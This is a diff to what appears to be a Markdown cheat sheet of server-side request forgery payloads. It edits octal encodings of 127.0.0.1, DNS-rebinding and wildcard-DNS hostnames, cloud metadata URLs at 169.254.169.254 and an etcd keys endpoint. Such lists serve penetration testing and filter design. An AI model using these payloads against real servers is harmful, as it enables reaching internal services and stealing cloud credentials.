@@ -38,8 +38,8 @@ http://0xa9fea9fe          = 169.254.169.254
 
 ```
 http://0177.0.0.1/         = 127.0.0.1
-http://o177.0.0.1/         = 127.0.0.1
-http://0o177.0.0.1/        = 127.0.0.1
+http://0177.0000.0000.0001/ = 127.0.0.1 (full octal)
+http://0177.1/              = 127.0.0.1 (mixed short)
 ```
 
 ### IPv6 Notation
@@ -65,9 +65,9 @@ http://127.0.1.3
 
 ```
 http://make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
-http://A.]127.0.0.1.nip.io
-http://localtest.me         -> resolves to ::1
-http://localh.st             -> resolves to 127.0.0.1
+http://127.0.0.1.nip.io
+http://localtest.me         -> resolves to 127.0.0.1
+http://spoofed.burpcollaborator.net  -> DNS rebinding service
 http://company.127.0.0.1.nip.io -> resolves to 127.0.0.1
 ```
 
@@ -146,7 +146,7 @@ http://169.254.169.254/metadata/v1/id
 http://169.254.169.254/metadata/v1/user-data
 ```
 
-### Kubernetes (ETCD)
+### Kubernetes / etcd
 
 ```
 http://127.0.0.1:2379/v2/keys/
